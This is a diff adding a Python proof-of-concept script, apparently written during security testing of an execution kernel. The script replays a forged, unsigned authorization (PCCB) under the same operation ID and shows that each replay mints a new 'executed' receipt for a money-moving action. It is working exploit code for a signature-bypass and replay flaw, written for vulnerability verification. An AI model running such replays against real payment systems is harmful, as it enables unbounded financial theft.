@@ -1,0 +1,96 @@
+#!/usr/bin/env python3
+"""
+Follow-up investigation: does replaying the SAME operation_id with an
+UNSIGNED PCCB, many times, mint a FRESH, uniquely-IDed 'executed' Receipt
+each time? If a downstream ledger credits money per distinct receipt_id
+(the natural way to consume a receipt stream), this is unbounded free
+money for the attacker, not just a one-time harmless replay.
+"""
+import sys
+sys.path.insert(0, "/home/user/actenon-kernel")
+sys.path.insert(0, "/home/user/actenon-kernel/tests")
+
+import tempfile
+from dataclasses import replace
+
+from actenon.execution.protected_executor import ProtectedExecutor
+from actenon.idempotency import IdempotencyStore
+from actenon.models.runtime import ProtectedExecutionRequest
+from actenon.proof import PCCBVerifier, VerifierDisclosureMode
+from actenon.replay import ReplayProtector, SqliteReplayStore
+
+from tests.security.helpers import (
+    build_security_context,
+    build_security_intent,
+    mint_security_pccb,
+    security_signer,
+    unsigned_pccb_with_action_hash,
+)
+
+
+class _Broker:
+    from actenon.credentials import BrokeredCredential
+    from datetime import timedelta
+
+    def acquire(self, intent, pccb, context):
+        return self.BrokeredCredential(
+            credential_id="cred_test",
+            issued_at=context.now,
+            expires_at=context.now + self.timedelta(minutes=5),
+            scope=("test",),
+        )
+
+    def release(self, credential, result):
+        pass
+
+
+def main() -> int:
+    with tempfile.TemporaryDirectory() as tempdir:
+        replay_db = tempfile.mktemp(suffix=".sqlite3", dir=tempdir)
+        executor = ProtectedExecutor(
+            proof_verifier=PCCBVerifier(security_signer(), disclosure_mode=VerifierDisclosureMode.LOCAL_DEBUG),
+            credential_broker=_Broker(),
+            replay_protector=ReplayProtector(SqliteReplayStore(replay_db)),
+            idempotency_store=IdempotencyStore(),
+        )
+
+        operation_id = "op_unbounded_demo"
+        amount = 1000
+        intent1 = replace(build_security_intent(amount_minor=amount), metadata={"operation_id": operation_id})
+        context1 = build_security_context()
+        pccb1 = mint_security_pccb(intent=intent1, context=context1)
+        request1 = ProtectedExecutionRequest(intent=intent1, pccb=pccb1, context=context1)
+
+        def handler(req, cred):
+            return {"result": "money_moved", "amount_minor": amount}
+
+        result1 = executor.execute(request1, handler)
+        print(f"Legit execution #0: receipt_id={result1.receipt.receipt_id}, outcome={result1.receipt.outcome}")
+
+        forged_pccb = unsigned_pccb_with_action_hash(intent1, context1)
+        receipt_ids = set()
+        N = 10
+        print(f"\nReplaying with an UNSIGNED PCCB {N} times (same operation_id, no valid signature)...")
+        for i in range(1, N + 1):
+            request_i = ProtectedExecutionRequest(intent=intent1, pccb=forged_pccb, context=context1)
+            result_i = executor.execute(request_i, handler)
+            rid = result_i.receipt.receipt_id if result_i.receipt else None
+            receipt_ids.add(rid)
+            print(f"  replay #{i}: refusal={result_i.refusal}, receipt_id={rid}, "
+                  f"outcome={result_i.receipt.outcome if result_i.receipt else None}, "
+                  f"amount claimed={result_i.payload.get('amount_minor') if result_i.payload else None}")
+
+        print(f"\nDistinct receipt_ids minted across {N} forged replays: {len(receipt_ids)}")
+        if len(receipt_ids) == N:
+            print(f"[CONFIRMED] Every single forged replay minted a BRAND-NEW, uniquely-numbered")
+            print(f"'executed' receipt for {amount} minor units, with NO valid signature checked")
+            print(f"after the very first legitimate call. A downstream ledger that credits money")
+            print(f"per distinct receipt_id (the normal way to consume a receipt stream) would pay")
+            print(f"out {N} x {amount} = {N * amount} minor units for ONE real authorization.")
+            print(f"This scales with however many requests the attacker is willing to send: UNBOUNDED.")
+            return 0
+        return 1
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
